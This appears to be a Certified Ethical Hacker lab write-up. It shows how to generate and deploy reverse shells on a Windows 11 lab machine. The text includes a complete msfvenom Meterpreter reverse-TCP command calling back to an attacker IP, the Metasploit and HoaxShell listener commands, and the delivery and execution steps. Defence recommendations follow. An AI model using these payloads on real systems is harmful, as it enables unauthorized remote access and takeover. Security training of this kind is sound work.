# CEH Lab Documentation: Reverse Shell Generator

## Lab Overview
**Lab Title:** Gain Access to a Remote System using Reverse Shell Generator  
**Attack Type:** Remote Access via Reverse Shell  
**Difficulty:** Advanced  
**Estimated Time:** 45 minutes

---

## Objective
Demonstrate the use of automated reverse shell generation and deployment to gain remote access to a target system using both MSFVenom (Meterpreter) and PowerShell-based payloads.

---

## Lab Environment

| Machine | OS | IP Address | Credentials |
|---------|-----|-----------|-------------|
| Attacker Machine | Parrot Security | 10.10.1.13 | attacker/toor |
| Target Machine | Windows 11 | 10.10.1.11 | Admin/Pa$$w0rd |

---

## Theoretical Background

### Reverse Shell Concept
- **Reverse Shell:** A connection initiated from the target system back to the attacker's system
- Unlike bind shells, reverse shells bypass firewall restrictions by establishing outbound connections
- The attacker sets up a listener, and the victim connects to it

### Reverse Shell Generator
- Automated tool for creating reverse shell payloads
- Provides GUI interface for payload generation
- Supports multiple payload types: MSFVenom, PowerShell, Python, etc.
- Generates both payload and listener configurations

### Attack Components
1. **Payload Generation:** Creating the malicious executable/script
2. **Listener Setup:** Configuring the attacker machine to receive connections
3. **Payload Delivery:** Transferring payload to target system
4. **Execution:** Running payload on victim machine
5. **Post-Exploitation:** Executing commands on compromised system

---

## Lab Steps

### Part A: Setup Reverse Shell Generator

#### Step 1: Prepare Attacker Machine

1. Open Terminal on Parrot Security machine
2. Switch to root user:
```bash
sudo su
```
3. Enter password: `toor`

#### Step 2: Start Reverse Shell Generator Docker Container

1. Run the Docker container:
```bash
docker run -d -p 80:80 reverse_shell_generator
```

**Troubleshooting:**
- If error occurs, stop Apache service first:
```bash
service apache2 stop
```
- Then retry the docker command

#### Step 3: Access Web Interface

1. Open Firefox web browser
2. Navigate to: `http://localhost`
3. Reverse Shell Generator GUI loads

---

### Part B: Generate and Deploy MSFVenom Payload

#### Step 4: Configure Payload Parameters

1. In the Reverse Shell Generator interface:
   - **IP field:** Enter `10.10.1.13` (attacker IP)
   - **Port field:** Enter `4444` (listener port)

#### Step 5: Generate MSFVenom Payload

1. Click on **MSFVenom** tab
2. Select: **Windows Meterpreter Staged Reverse TCP (x64)**
3. Review the generated msfvenom command
4. Scroll down and click **Copy** button

#### Step 6: Create Payload File

1. Switch to terminal window
2. Paste the copied msfvenom command
3. Press Enter to generate `reverse.exe`

**Generated Command Example:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe > reverse.exe
```

#### Step 7: Setup Listener

1. Switch back to browser window
2. Under **Listener** section:
   - Select **msfconsole** from Type dropdown
3. Click **Copy** to copy the listener code

#### Step 8: Start Metasploit Listener

1. Switch to terminal window
2. Paste the copied listener code
3. Press Enter to start Metasploit console

**Generated Listener Commands:**
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.1.13; set LPORT 4444; exploit"
```

#### Step 9: Transfer Payload to Target

1. Click **Places** → **Home Folder**
2. Navigate to `/home/attacker`
3. Copy `reverse.exe` file

4. Access Windows 11 shared folder:
   - Click **Places** → **ceh-tools on 10.10.1.11**
   
**Alternative Access Method:**
- If shared folder not visible:
  - Click **Places** → **Network**
  - Press `Ctrl+L`
  - Type: `smb://10.10.1.11`
  - Enter credentials: Admin/Pa$$w0rd
  - Click **Connect**
  - Double-click **CEH-Tools** folder

5. Navigate to: `CEHv13 Module 06 System Hacking`
6. Paste `reverse.exe` file

#### Step 10: Execute Payload on Target

**Target Machine (Windows 11):**

1. Login with credentials: Admin/Pa$$w0rd
2. Navigate to: `E:\CEH-Tools\CEHv13 Module 06 System Hacking`
3. Copy `reverse.exe` to Desktop
4. Double-click `reverse.exe` to execute
5. If UAC prompt appears, click **Yes**

#### Step 11: Verify Connection

**Attacker Machine:**

1. Switch to terminal window with Metasploit listener
2. Observe: Session created message
3. Test connection:
```bash
getuid
```

**Expected Output:**
- Displays current user ID of compromised system
- Confirms successful Meterpreter session

---

### Part C: Generate and Deploy PowerShell Payload

#### Step 12: Generate PowerShell Payload

1. Switch to browser window
2. Click **HoaxShell** tab
3. Select **PowerShell IEX** from left pane
4. Change port number to **444** in payload
5. Click **Copy** button

#### Step 13: Create PowerShell Script

1. Open new terminal as superuser:
```bash
sudo su
```

2. Create script file:
```bash
pluma shell.ps1
```

3. Paste the copied PowerShell payload
4. Save file and close editor

#### Step 14: Setup HoaxShell Listener

1. Switch to Firefox browser
2. Ensure port number is **444**
3. Under **Listener** section:
   - Select **hoaxshell** from Type dropdown
4. Click **Copy** to copy listener code

#### Step 15: Start HoaxShell Listener

1. Switch to terminal window
2. Paste the copied listener code
3. Press Enter to start listener

**Listener Command Example:**
```bash
hoaxshell -s 10.10.1.13 -p 444
```

#### Step 16: Transfer PowerShell Payload

1. Click **Places** → **Home Folder**
2. Navigate to `/home/attacker`
3. Copy `shell.ps1` file
4. Navigate to Windows 11 shared folder: `ceh-tools on 10.10.1.11`
5. Paste in: `CEHv13 Module 06 System Hacking` directory

#### Step 17: Execute PowerShell Payload on Target

**Target Machine (Windows 11):**

1. Navigate to: `E:\CEH-Tools\CEHv13 Module 06 System Hacking`
2. Copy `shell.ps1` to Desktop

3. Open PowerShell as Administrator:
   - Search: `powershell`
   - Click: **Run as Administrator**
   - If UAC prompt appears, click **Yes**

4. Navigate to Desktop:
```powershell
cd C:\Users\Admin\Desktop\
```

5. Execute payload:
```powershell
.\shell.ps1
```

#### Step 18: Verify PowerShell Session

**Attacker Machine:**

1. Switch to terminal window with HoaxShell listener
2. Observe: Session created message
3. Test connection:
```bash
whoami
```

**Expected Output:**
- Displays logged-on username
- Confirms successful shell session

---

## Results & Findings

### MSFVenom (Meterpreter) Session
- **Payload Type:** Windows x64 Meterpreter Reverse TCP
- **Listener Port:** 4444
- **Session Type:** Meterpreter
- **User Context:** Verified via `getuid`
- **Status:** ✓ Successful

### PowerShell (HoaxShell) Session
- **Payload Type:** PowerShell IEX
- **Listener Port:** 444
- **Session Type:** Command Shell
- **User Context:** Admin user
- **Status:** ✓ Successful

### Captured Information
- **Target System:** Windows 11 (10.10.1.11)
- **Compromised User:** Admin
- **Access Level:** Administrative
- **Remote Control:** Full command execution capability

---

## Cleanup Steps

1. Close all terminal windows on Parrot Security
2. Stop Docker container:
```bash
docker stop $(docker ps -q --filter ancestor=reverse_shell_generator)
```
3. Switch to Windows 11 machine
4. Delete `reverse.exe` and `shell.ps1` from Desktop
5. Sign out from Admin account
6. Turn off both virtual machines

---

## Key Takeaways

### Attack Methodology
- **Automation:** Reverse Shell Generator simplifies payload creation
- **Multiple Vectors:** MSFVenom (binary) and PowerShell (fileless) approaches
- **Listener Coordination:** Matching payload and listener configurations critical
- **Social Engineering:** Requires user execution (email, physical media, etc.)

### Payload Comparison

| Aspect | MSFVenom | PowerShell |
|--------|----------|------------|
| Detection | Higher (executable file) | Lower (script-based) |
| Functionality | Full Meterpreter features | Command execution |
| Persistence | Requires binary | Fileless execution |
| AV Evasion | More difficult | Easier to obfuscate |

### Security Implications
- Outbound connections often allowed by firewalls
- User execution remains critical attack component
- Administrative privileges enhance compromise impact
- Multiple payload types increase attack success probability

---

## Defense Recommendations

### Network Security
1. **Egress Filtering:** Monitor and restrict outbound connections
2. **IDS/IPS:** Deploy intrusion detection systems
3. **Application Whitelisting:** Control executable execution
4. **PowerShell Logging:** Enable script block logging

### Endpoint Protection
1. **Antivirus/EDR:** Deploy modern endpoint detection solutions
2. **Execution Prevention:** Implement application control policies
3. **User Training:** Educate about social engineering tactics
4. **Least Privilege:** Limit administrative access

### Monitoring & Detection
1. Monitor for:
   - Unusual outbound connections
   - PowerShell execution patterns
   - Unsigned executable execution
   - Privilege escalation attempts
2. Implement Security Information and Event Management (SIEM)
3. Regular security audits and penetration testing

---

## Tools Used

| Tool | Purpose | Port/Protocol |
|------|---------|---------------|
| Reverse Shell Generator | Payload generation automation | HTTP (80) |
| MSFVenom | Binary payload creation | - |
| Metasploit (msfconsole) | Listener for Meterpreter | TCP 4444 |
| HoaxShell | PowerShell payload listener | TCP 444 |
| Docker | Container runtime | - |

---

## References & Additional Reading
- Metasploit Framework Documentation
- PowerShell Attack Vectors
- Reverse Shell Techniques
- Network Egress Filtering Best Practices
- Endpoint Detection and Response (EDR) Solutions

---

## Lab Completion Status
- [x] Environment Setup
- [x] Reverse Shell Generator Installation
- [x] MSFVenom Payload Generation
- [x] Meterpreter Session Established
- [x] PowerShell Payload Generation
- [x] HoaxShell Session Established
- [x] Documentation
- [x] Cleanup

**Lab Completed:** [Date]  
**Documented By:** [Your Name]

---

**Note:** This lab demonstrates techniques used in authorized penetration testing and security assessments. Always obtain proper authorization before conducting security testing.